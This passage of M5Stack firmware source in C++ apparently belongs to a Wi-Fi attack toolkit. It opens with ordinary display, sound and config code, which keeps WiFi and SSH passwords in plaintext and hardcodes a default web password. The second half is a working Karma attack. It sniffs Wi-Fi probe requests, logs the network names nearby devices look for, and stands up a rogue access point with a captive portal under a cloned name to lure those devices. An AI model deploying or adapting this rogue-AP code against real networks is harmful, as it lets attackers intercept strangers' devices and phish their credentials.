  enterDebounce();
  while (!imageSelected) {
    if (!imageMode) {
      // Mode Liste
      if (needDisplayUpdate) {
        M5.Display.clear();
        M5.Display.setCursor(0, 0);
        M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
        M5.Display.println("Select Startup Image:");

        for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < images.size(); i++) {
          int itemIndex = menuStartIndex + i;
          if (itemIndex == currentImageIndex) {
            M5.Display.setTextColor(menuTextFocusedColor); // Sélectionner la couleur
          } else {
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); // Non sélectionné
          }
          M5.Display.println(images[itemIndex]);
        }

        needDisplayUpdate = false; // Réinitialiser le besoin de mise à jour
      }
    } else {
      // Mode Affichage direct des images
      if (needDisplayUpdate) {
        M5.Display.clear();
        String ThisImg = "/img/" + images[currentImageIndex];
        drawImage(ThisImg.c_str());
        needDisplayUpdate = false; // Mise à jour effectuée
      }
    }

    M5.update();


    // Navigation dans la liste ou les images
    if (M5.BtnA.wasPressed()) {
      currentImageIndex = (currentImageIndex - 1 + images.size()) % images.size();
      if (!imageMode) {
        // Mise à jour de la liste
        if (currentImageIndex < menuStartIndex) {
          menuStartIndex = currentImageIndex;
        } else if (currentImageIndex >= menuStartIndex + maxDisplayItems) {
          menuStartIndex = currentImageIndex - maxDisplayItems + 1;
        }
      }
      needDisplayUpdate = true;  // Mettre à jour l'affichage
    } else if (M5.BtnC.wasPressed()) {
      currentImageIndex = (currentImageIndex + 1) % images.size();
      if (!imageMode) {
        // Mise à jour de la liste
        if (currentImageIndex >= menuStartIndex + maxDisplayItems) {
          menuStartIndex = currentImageIndex - maxDisplayItems + 1;
        } else if (currentImageIndex < menuStartIndex) {
          menuStartIndex = currentImageIndex;
        }
      }
      needDisplayUpdate = true;  // Mettre à jour l'affichage
    }

    // Basculer entre les modes Liste/Images avec la touche 'P'
    if (M5.BtnPWR.wasClicked()) {
      imageMode = !imageMode;  // Basculer le mode
      needDisplayUpdate = true;  // Forcer la mise à jour
    }

    // Sélection d'une image avec la touche Entrée
    if (M5.BtnB.wasPressed()) {
      selectedStartupImage = images[currentImageIndex];
      saveStartupImageConfig(selectedStartupImage);
      String ThisImg = "/img/" + images[currentImageIndex];
      drawImage(ThisImg.c_str());
      delay(1000);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.fillScreen(menuBackgroundColor);
      M5.Display.setCursor(0, M5.Display.height() / 2);
      M5.Display.print("Startup image set to\n" + selectedStartupImage);
      delay(1000);
      imageSelected = true;
    }

    // Sortir du mode sélection avec la touche Retour
    if (M5.BtnB.wasPressed()) {
      imageSelected = true;
    }

    delay(150);  // Anti-rebond pour les touches
  }
}




void toggleSound() {
  inMenu = false;
  soundOn = !soundOn;  // Inverse l'état du son

  // Sauvegarde le nouvel état dans le fichier de configuration
  saveConfigParameter("soundOn", soundOn);
}

void toggleLED() {
  inMenu = false;
  ledOn = !ledOn;  // Inverse l'état du LED

  // Sauvegarde le nouvel état dans le fichier de configuration
  saveConfigParameter("ledOn", ledOn);

}

void brightness() {
  int currentBrightness = M5.Display.getBrightness();
  int minBrightness = 1;
  int maxBrightness = 255;

  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);

  bool brightnessAdjusted = true;

  while (true) {
    M5.update();
    handleDnsRequestSerial();
    if (M5.BtnA.wasPressed()) {
      currentBrightness = max(minBrightness, currentBrightness - 12);
      brightnessAdjusted = true;
    } else if (M5.BtnC.wasPressed()) {
      currentBrightness = min(maxBrightness, currentBrightness + 12);
      brightnessAdjusted = true;
    } else if (M5.BtnB.wasPressed()) {
      saveConfigParameter("brightness", currentBrightness);
      break;
    }

    if (brightnessAdjusted) {
      float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
      M5.Display.fillScreen(TFT_BLACK);
      M5.Display.setCursor(10, M5.Display.height() / 2 - 10);
      M5.Display.print("     Brightness: ");
      M5.Display.print((int)brightnessPercentage);
      M5.Display.println("%");
      M5.Display.setBrightness(currentBrightness);
      M5.Display.display();
      brightnessAdjusted = false;
    }
  }

  float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
  waitAndReturnToMenu("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
}


void adjustVolume() {
  int currentVolume = M5.Speaker.getVolume();  // Récupère le volume actuel
  int minVolume = 0;  // Volume minimum
  int maxVolume = 255;  // Volume maximum

  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(menuTextUnFocusedColor);

  bool volumeAdjusted = true;
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200;  // Définir un délai de debounce de 200 ms

  enterDebounce();

  while (true) {
    M5.update();


    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5.BtnA.wasPressed()) {
        currentVolume = max(minVolume, currentVolume - 12);
        volumeAdjusted = true;
        lastKeyPressTime = millis();
      } else if (M5.BtnC.wasPressed()) {
        currentVolume = min(maxVolume, currentVolume + 12);
        volumeAdjusted = true;
        lastKeyPressTime = millis();
      } else if (M5.BtnB.wasPressed()) {
        saveConfigParameter("volume", currentVolume);
        break;
      } else if (M5.BtnB.wasPressed()) {
        inMenu = true;
        drawMenu();
        break;
      }
    }

    if (volumeAdjusted) {
      float volumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
      M5.Display.fillScreen(menuBackgroundColor);
      M5.Display.setCursor(50, M5.Display.height() / 2);
      M5.Display.print("Volume: ");
      M5.Display.print((int)volumePercentage);
      M5.Display.println("%");
      M5.Speaker.setVolume(currentVolume);
      M5.Display.display();
      volumeAdjusted = false;
    }
  }

  float finalVolumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setCursor(50, M5.Display.height() / 2);
  M5.Display.print("Volume set to " + String((int)finalVolumePercentage) + "%");
  delay(1000);
}



void saveConfigParameter(String key, int value) {
  if (!SD.exists(configFolderPath)) {
    SD.mkdir(configFolderPath);
  }

  String content = "";
  File configFile = SD.open(configFilePath, FILE_READ);
  if (configFile) {
    while (configFile.available()) {
      content += configFile.readStringUntil('\n') + '\n';
    }
    configFile.close();
  } else {
    Serial.println("Error when opening config.txt for reading");
    return;
  }

  int startPos = content.indexOf(key + "=");
  if (startPos != -1) {
    int endPos = content.indexOf('\n', startPos);
    String oldValue = content.substring(startPos, endPos);
    content.replace(oldValue, key + "=" + String(value));
  } else {
    content += key + "=" + String(value) + "\n";
  }

  configFile = SD.open(configFilePath, FILE_WRITE);
  if (configFile) {
    configFile.print(content);
    configFile.close();
    Serial.println(key + " saved!");
  } else {
    Serial.println("Error when opening config.txt for writing");
  }
}

void restoreConfigParameter(String key) {
  if (SD.exists(configFilePath)) {
    File configFile = SD.open(configFilePath, FILE_READ);
    if (configFile) {
      String line;
      String stringValue;
      int intValue = -1;
      bool boolValue = false;
      bool keyFound = false;

      while (configFile.available()) {
        line = configFile.readStringUntil('\n');
        if (line.startsWith(key + "=")) {
          stringValue = line.substring(line.indexOf('=') + 1);
          if (key == "brightness") {
            intValue = stringValue.toInt();
            M5.Display.setBrightness(intValue);
            Serial.println("Brightness restored to " + String(intValue));
          } else if (key == "volume") {
            intValue = stringValue.toInt();
            M5.Speaker.setVolume(intValue);
            Serial.println("Volume restored to " + String(intValue));
          } else if (key == "ledOn" || key == "soundOn") {
            boolValue = (stringValue == "1");
            Serial.println(key + " restored to " + String(boolValue));
          } else if (key == "randomOn") {
            boolValue = (stringValue == "1");
            Serial.println("Random Startup restored to " + String(boolValue));
          } else if (key == "selectedTheme") {
            selectedTheme = stringValue;
            Serial.println("Selected Theme restored to " + stringValue);
          } else if (key == "wifi_ssid" && ssid.length() == 0) {
            stringValue.toCharArray(ssid_buffer, sizeof(ssid_buffer));
            ssid = ssid_buffer;
            Serial.println("WiFi SSID restored to " + stringValue);
          } else if (key == "wifi_password" && password.length() == 0) {
            stringValue.toCharArray(password_buffer, sizeof(password_buffer));
            password = password_buffer;
            Serial.println("WiFi Password restored");
          } else if (key == "ssh_user" && ssh_user.length() == 0) {
            ssh_user = stringValue;
            Serial.println("SSH User restored to " + stringValue);
          } else if (key == "ssh_host" && ssh_host.length() == 0) {
            ssh_host = stringValue;
            Serial.println("SSH Host restored to " + stringValue);
          } else if (key == "ssh_password" && ssh_password.length() == 0) {
            ssh_password = stringValue;
            Serial.println("SSH Password restored");
          } else if (key == "ssh_port") {
            intValue = stringValue.toInt();
            ssh_port = intValue;
            Serial.println("SSH Port restored to " + String(intValue));
          } else if (key == "tcp_host") {
            tcp_host = stringValue;
            Serial.println("TCP host restored to " + String(intValue));
          } else if (key == "tcp_port") {
            intValue = stringValue.toInt();
            tcp_port = intValue;
            Serial.println("TCP Port restored to " + String(intValue));
          } else if (key == "baudrate_gps") {
            intValue = stringValue.toInt();
            baudrate_gps = intValue;
            Serial.println("GPS Baudrate restored to " + String(intValue));
          } else if (key == "webpassword") {
            accessWebPassword = stringValue;
            Serial.println("Web password restored");
          }
          keyFound = true;
          break;
        }
      }
      configFile.close();

      if (!keyFound) {
        Serial.println("Key not found in config, using default for " + key);
        if (key == "brightness") {
          M5.Display.setBrightness(defaultBrightness);
        } else if (key == "volume") {
          M5.Speaker.setVolume(180); // Par défaut à 70% du volume maximum
        } else if (key == "ledOn") {
          boolValue = false;  // Default to LED off
        } else if (key == "soundOn") {
          boolValue = false;  // Default to sound off
        } else if (key == "randomOn") {
          boolValue = false;  // Default to random startup disabled
        } else if (key == "baudrate_gps") {
          baudrate_gps = 9600; // Default baudrate for GPS
        } else if (key == "webpassword") {
          accessWebPassword = "7h30th3r0n3"; // Default web password
        }
      }

      // Appliquer les paramètres après récupération
      if (key == "ledOn") {
        ledOn = boolValue;
      } else if (key == "soundOn") {
        soundOn = boolValue;
      } else if (key == "randomOn") {
        randomOn = boolValue;
      }

    } else {
      Serial.println("Error when opening config.txt");
    }
  } else {
    Serial.println("Config file not found, using default values");
    if (key == "brightness") {
      M5.Display.setBrightness(defaultBrightness);
    } else if (key == "volume") {
      M5.Speaker.setVolume(180); // Par défaut à 70% du volume maximum
    } else if (key == "ledOn") {
      ledOn = false;  // Default to LED off
    } else if (key == "soundOn") {
      soundOn = false;  // Default to sound off
    } else if (key == "randomOn") {
      randomOn = false;  // Default to random startup disabled
    } else if (key == "baudrate_gps") {
      baudrate_gps = 9600; // Default baudrate for GPS
    } else if (key == "webpassword") {
      accessWebPassword = "7h30th3r0n3"; // Default web password
    }
  }
}




// Helper function for theming
int getColorValue(const char* colorName) {
  // All TFT_[COLOR] colors defined by M5stack
  if (strcmp(colorName, "TFT_BLACK") == 0) return TFT_BLACK;
  if (strcmp(colorName, "TFT_NAVY") == 0) return TFT_NAVY;
  if (strcmp(colorName, "TFT_DARKGREEN") == 0) return TFT_DARKGREEN;
  if (strcmp(colorName, "TFT_DARKCYAN") == 0) return TFT_DARKCYAN;
  if (strcmp(colorName, "TFT_MAROON") == 0) return TFT_MAROON;
  if (strcmp(colorName, "TFT_PURPLE") == 0) return TFT_PURPLE;
  if (strcmp(colorName, "TFT_OLIVE") == 0) return TFT_OLIVE;
  if (strcmp(colorName, "TFT_LIGHTGREY") == 0) return TFT_LIGHTGREY;
  if (strcmp(colorName, "TFT_DARKGREY") == 0) return TFT_DARKGREY;
  if (strcmp(colorName, "TFT_BLUE") == 0) return TFT_BLUE;
  if (strcmp(colorName, "TFT_GREEN") == 0) return TFT_GREEN;
  if (strcmp(colorName, "TFT_CYAN") == 0) return TFT_CYAN;
  if (strcmp(colorName, "TFT_RED") == 0) return TFT_RED;
  if (strcmp(colorName, "TFT_MAGENTA") == 0) return TFT_MAGENTA;
  if (strcmp(colorName, "TFT_YELLOW") == 0) return TFT_YELLOW;
  if (strcmp(colorName, "TFT_WHITE") == 0) return TFT_WHITE;
  if (strcmp(colorName, "TFT_ORANGE") == 0) return TFT_ORANGE;
  if (strcmp(colorName, "TFT_GREENYELLOW") == 0) return TFT_GREENYELLOW;
  if (strcmp(colorName, "TFT_PINK") == 0) return TFT_PINK;
  if (strcmp(colorName, "TFT_BROWN") == 0) return TFT_BROWN;
  if (strcmp(colorName, "TFT_GOLD") == 0) return TFT_GOLD;
  // Can add your own colors via:
  // if (strcmp(colorName, "[CUSTOM_NAME]") == 0) return M5.Lcd.color565(uint8_t r,uint8_t g,uint8_t b);
  return -1; // Error Case
}

void restoreThemeParameters() {
  Serial.println("Opening Theme File: ");
  Serial.println(selectedTheme.c_str());
  IniFile ini(selectedTheme.c_str());
  if (!ini.open()) {
    Serial.println("Error opening INI file");
    return;
  }

  const size_t bufferLen = 80;
  char valueBuffer[bufferLen]; // Buffer for reading string values
  IniFileState state; // Needed for the getValue calls

  // Read and assign each configuration value from the INI file
  if (!ini.getValue("theme", "taskbarBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read taskbarBackgroundColor");
    return; // Exit if any key read fails
  }
  taskbarBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "taskbarTextColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read taskbarTextColor");
    return;
  }
  taskbarTextColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "taskbarDividerColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read taskbarDividerColor");
    return;
  }
  taskbarDividerColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuBackgroundColor");
    return;
  }
  menuBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuSelectedBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuSelectedBackgroundColor");
    return;
  }
  menuSelectedBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuTextFocusedColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuTextFocusedColor");
    return;
  }
  menuTextFocusedColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuTextUnFocusedColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuTextUnFocusedColor");
    return;
  }
  menuTextUnFocusedColor = getColorValue(valueBuffer);

  // Read the boolean value
  if (!ini.getValue("theme", "Colorful", valueBuffer, bufferLen)) {
    Serial.println("Failed to read Colorful");
    return;
  }
  Colorful = (strncmp(valueBuffer, "true", 4) == 0);

  // Close the file
  ini.close();

  // Optionally, print the values to verify
  Serial.println(taskbarBackgroundColor);
  Serial.println(taskbarTextColor);
  Serial.println(taskbarDividerColor);
  Serial.println(menuBackgroundColor);
  Serial.println(menuSelectedBackgroundColor);
  Serial.println(menuTextFocusedColor);
  Serial.println(menuTextUnFocusedColor);
  Serial.println(Colorful ? "True" : "False");
}




//KARMA-PART-FUNCTIONS

void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (ssid_count_Karma == 0) {
    M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
    M5.Display.println("Waiting for probe...");
  }

  if (frame_type == 0x40) { // Probe Request Frame
    uint8_t ssid_length_Karma = frame[25];
    if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
      char ssidKarma[33] = {0};
      memcpy(ssidKarma, &frame[26], ssid_length_Karma);
      ssidKarma[ssid_length_Karma] = '\0';
      if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
        return;
      }

      bool ssidExistsKarma = false;
      for (int i = 0; i < ssid_count_Karma; i++) {
        if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
          ssidExistsKarma = true;
          break;
        }
      }


      if (isSSIDWhitelisted(ssidKarma)) {
        if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
          seenWhitelistedSSIDs.insert(ssidKarma);
          Serial.println("SSID in whitelist, ignoring: " + String(ssidKarma));
        }
        return;
      }

      if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
        strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
        updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
        Serial.print("Found: ");
        if (ledOn) {
          pixels.setPixelColor(0, pixels.Color(255, 0, 0));
          pixels.setPixelColor(9, pixels.Color(255, 0, 0));
          pixels.show();
          delay(50);

          pixels.setPixelColor(0, pixels.Color(0, 0, 0));
          pixels.setPixelColor(9, pixels.Color(0, 0, 0));
          pixels.show();
          delay(50);
        }
        Serial.println(ssidKarma);
      }
    }
  }
}

void saveSSIDToFile(const char* ssid) {
  bool ssidExists = false;
  File readfile = SD.open("/probes.txt", FILE_READ);
  if (readfile) {
    while (readfile.available()) {
      String line = readfile.readStringUntil('\n');
      if (line.equals(ssid)) {
        ssidExists = true;
        break;
      }
    }
    readfile.close();
  }
  if (!ssidExists) {
    File file = SD.open("/probes.txt", FILE_APPEND);
    if (file) {
      file.println(ssid);
      file.close();
    } else {
      Serial.println("Error opening probes.txt");
    }
  }
}


void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
  const int maxLength = 22;
  char truncatedSSID[23];

  M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 60, TFT_BLACK);
  int startIndexKarma = max(0, count - maxMenuDisplayKarma);

  for (int i = startIndexKarma; i < count; i++) {
    int lineIndexKarma = i - startIndexKarma;
    M5.Display.setCursor(0, lineIndexKarma * 20);

    if (strlen(ssidsKarma[i]) > maxLength) {
      strncpy(truncatedSSID, ssidsKarma[i], maxLength);
      truncatedSSID[maxLength] = '\0';
      M5.Display.printf("%d.%s", i + 1, truncatedSSID);
    } else {
      M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
    }
  }
  if ( count <= 9) {
    M5.Display.fillRect(M5.Display.width() - 15, 0, 15, 20, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 13, 3);
  } else if ( count >= 10 && count <= 99) {
    M5.Display.fillRect(M5.Display.width() - 30, 0, 30, 20, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 27, 3);
  } else if ( count >= 100 && count < MAX_SSIDS_Karma * 0.7) {
    M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_ORANGE);
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.setCursor(M5.Display.width() - 42, 3);
    M5.Display.setTextColor(TFT_WHITE);
  } else {
    M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_RED);
    M5.Display.setCursor(M5.Display.width() - 42, 3);
  }
  if (count == MAX_SSIDS_Karma) {
    M5.Display.printf("MAX");
  } else {
    M5.Display.printf("%d", count);
  }
  M5.Display.display();
}


void drawStartButtonKarma() {
  M5.Display.clear();
  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_GREEN);
  M5.Display.setCursor(100, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_BLACK);
  M5.Display.println("Start Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(100, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop Sniff");

}

void startScanKarma() {
  isScanningKarma = true;
  ssid_count_Karma = 0;
  M5.Display.clear();
  drawStopButtonKarma();
  ESP_BT.end();
  bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg1);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

  readConfigFile("/config/config.txt");
  seenWhitelistedSSIDs.clear();

    File file = SD.open("/probeswdatetime.txt", FILE_APPEND);
  if (file) {
    auto dt = M5.Rtc.getDateTime(); // Get current RTC datetime
    file.printf("\n--- Probe Sniffing Started: %04d-%02d-%02d %02d:%02d:%02d ---\n",
                dt.date.year, dt.date.month, dt.date.date,
                dt.time.hours, dt.time.minutes, dt.time.seconds);
    file.close();
  }

  Serial.println("-------------------");
  Serial.println("Probe Sniffing Started...");
  Serial.println("-------------------");
}


void stopScanKarma() {
  Serial.println("-------------------");
  Serial.println("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
  Serial.println("-------------------");
  isScanningKarma = false;
  esp_wifi_set_promiscuous(false);


  if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
    Serial.println("Saving SSIDs to SD card automatically...");
    File file = SD.open("/probeswdatetime.txt", FILE_APPEND);
    if (file) {
      for (int i = 0; i < ssid_count_Karma; i++) {
        auto dt = M5.Rtc.getDateTime(); // Get current RTC datetime
        file.printf("%s | %04d-%02d-%02d %02d:%02d:%02d\n",
                    ssidsKarma[i], dt.date.year, dt.date.month, dt.date.date,
                    dt.time.hours, dt.time.minutes, dt.time.seconds);
      }
      file.close();
    } else {
      Serial.println("Failed to open probeswdatetime.txt for writing!");
    }
    for (int i = 0; i < ssid_count_Karma; i++) {
      saveSSIDToFile(ssidsKarma[i]);
    }
    Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
  } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
    bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
    if (saveSSID) {
      M5.Display.clear();
      M5.Display.setCursor(50 , M5.Display.height() / 2 );
      M5.Display.println("Saving SSIDs on SD..");
      File file = SD.open("/probeswdatetime.txt", FILE_APPEND);
      if (file) {
        for (int i = 0; i < ssid_count_Karma; i++) {
          auto dt = M5.Rtc.getDateTime(); // Get current RTC datetime
          file.printf("%s | %04d-%02d-%02d %02d:%02d:%02d\n",
                      ssidsKarma[i], dt.date.year, dt.date.month, dt.date.date,
                      dt.time.hours, dt.time.minutes, dt.time.seconds);
        }
        file.close();
      } else {
        Serial.println("Failed to open probeswdatetime.txt for writing!");
      }
      for (int i = 0; i < ssid_count_Karma; i++) {
        saveSSIDToFile(ssidsKarma[i]);
      }
      M5.Display.clear();
      M5.Display.setCursor(50 , M5.Display.height() / 2 );
      M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
      Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
    } else {
      M5.Display.clear();
      M5.Display.setCursor(50 , M5.Display.height() / 2 );
      M5.Display.println("  No SSID saved.");
    }
    delay(1000);
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
  }


  menuSizeKarma = ssid_count_Karma;
  currentIndexKarma = 0;
  menuStartIndexKarma = 0;

  if (isKarmaMode && ssid_count_Karma > 0) {
    drawMenuKarma();
    currentStateKarma = StopScanKarma;
  } else {
    currentStateKarma = StartScanKarma;
    inMenu = true;
    drawMenu();
  }
  isKarmaMode = false;
  isProbeSniffingMode = false;
  stopProbeSniffingViaSerial = false;
}



void handleMenuInputKarma() {
  bool stateChanged = false;

  if (M5.BtnA.wasPressed()) {
    currentIndexKarma--;
    if (currentIndexKarma < 0) {
      currentIndexKarma = menuSizeKarma - 1;
    }
    stateChanged = true;
  } else if (M5.BtnC.wasPressed()) {
    currentIndexKarma++;
    if (currentIndexKarma >= menuSizeKarma) {
      currentIndexKarma = 0;
    }
    stateChanged = true;
  }

  if (stateChanged) {
    menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
  }

  if (M5.BtnB.wasPressed()) {
    executeMenuItemKarma(currentIndexKarma);
    stateChanged = true;
  }
  if (stateChanged) {
    drawMenuKarma();
  }
}


void drawMenuKarma() {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextFont(1);

  int lineHeight = 24;
  int startX = 10;
  int startY = 25;

  for (int i = 0; i < maxMenuDisplayKarma; i++) {
    int menuIndexKarma = menuStartIndexKarma + i;
    if (menuIndexKarma >= menuSizeKarma) break;

    if (menuIndexKarma == currentIndexKarma) {
      M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
    M5.Display.println(ssidsKarma[menuIndexKarma]);
  }
  M5.Display.display();
}

void executeMenuItemKarma(int indexKarma) {
  if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
    startAPWithSSIDKarma(ssidsKarma[indexKarma]);
  } else {
    M5.Display.clear();
    M5.Display.println("Selection invalide!");
    delay(1000);
    drawStartButtonKarma();
    currentStateKarma = StartScanKarma;
  }
}

void startAPWithSSIDKarma(const char* ssid) {
  clonedSSID = String(ssid);
  isProbeKarmaAttackMode = true;
  readConfigFile("/config/config.txt");
  createCaptivePortal();

  Serial.println("-------------------");
  Serial.println("Karma Attack started for : " + String(ssid));
  Serial.println("-------------------");

  M5.Display.clear();
  unsigned long startTime = millis();
  unsigned long currentTime;
  int remainingTime;
  int clientCount = 0;
  int scanTimeKarma = 60; // Scan time for karma attack (not for Karma Auto)

  while (true) {
    M5.update();
    handleDnsRequestSerial();
    currentTime = millis();
    remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
    clientCount = WiFi.softAPgetStationNum();

    M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
    M5.Display.println(String(ssid));

    int textWidth = 12 * 16;
    M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 90, textWidth, 20, TFT_BLACK);
    M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 90);
    M5.Display.print("Left Time: ");
    M5.Display.print(remainingTime);
    M5.Display.println(" s");

    textWidth = 12 * 20;
    M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 130, textWidth, 20, TFT_BLACK);
    M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 130);
    M5.Display.print("Connected Client: ");
    M5.Display.println(clientCount);

    Serial.println("---Karma-Attack---");
    Serial.println("On :" + String(ssid));
    Serial.println("Left Time: " + String(remainingTime) + "s");
    Serial.println("Connected Client: " + String(clientCount));
    Serial.println("-------------------");


    M5.Display.setCursor(130, 220);
    M5.Display.println(" Stop");
    M5.Display.display();

    if (remainingTime <= 0) {
      break;
    }
    if (M5.BtnB.wasPressed()) {
      break;
    } else {
      delay(200);
    }

  }
  M5.Display.clear();
  M5.Display.setCursor(50 , M5.Display.height() / 2 );
  if (clientCount > 0) {
    M5.Display.println("Karma Successful!!!");
    Serial.println("-------------------");
    Serial.println("Karma Attack worked !");
    Serial.println("-------------------");
    if (vibration) {
      M5.Power.Axp192.setLDO3(3300);
      delay(500);
      M5.Power.Axp192.setLDO3(0);
    }
  } else {
    M5.Display.println(" Karma Failed...");
    Serial.println("-------------------");
    Serial.println("Karma Attack failed...");
    Serial.println("-------------------");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
  delay(2000);
  if (confirmPopup("Save " + String(ssid) + " ?" )) {
    saveSSIDToFile(ssid);
  }
  lastIndex = -1;
  inMenu = true;
  isProbeKarmaAttackMode = false;
  currentStateKarma = StartScanKarma;
  memset(ssidsKarma, 0, sizeof(ssidsKarma));
  ssid_count_Karma = 0;
  drawMenu();
}

void listProbes() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0 && !isProbePresent(probes, numProbes, line)) {
      probes[numProbes++] = line;

    }
  }
  file.close();
  if (numProbes == 0) {
    Serial.println("-------------------");
    Serial.println(" No probes found");
    Serial.println("-------------------");
    waitAndReturnToMenu(" No probes found");
    return;
  }

  const int maxDisplay = 11;
  const int maxSSIDLength = 23; // Adjust based on your display width
  int currentListIndex = 0;
  int listStartIndex = 0;
  int selectedIndex = -1;
  bool needDisplayUpdate = true;

  while (selectedIndex == -1) {
    M5.update();
    handleDnsRequestSerial();
    bool indexChanged = false;
    if (M5.BtnA.wasPressed()) {
      currentListIndex--;
      if (currentListIndex < 0) currentListIndex = numProbes - 1;
      indexChanged = true;
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex++;
      if (currentListIndex >= numProbes) currentListIndex = 0;
      indexChanged = true;
    } else if (M5.BtnB.wasPressed()) {
      selectedIndex = currentListIndex;
    }

    if (indexChanged) {
      listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
      needDisplayUpdate = true;
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      int y = 10;

      for (int i = 0; i < maxDisplay; i++) {
        int probeIndex = listStartIndex + i;
        if (probeIndex >= numProbes) break;

        String ssid = probes[probeIndex];
        if (ssid.length() > maxSSIDLength) {
          ssid = ssid.substring(0, maxSSIDLength) + "..";
        }

        M5.Display.setCursor(10, y);
        M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
        M5.Display.println(ssid);
        y += 20;
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }
  }
  Serial.println("-------------------");
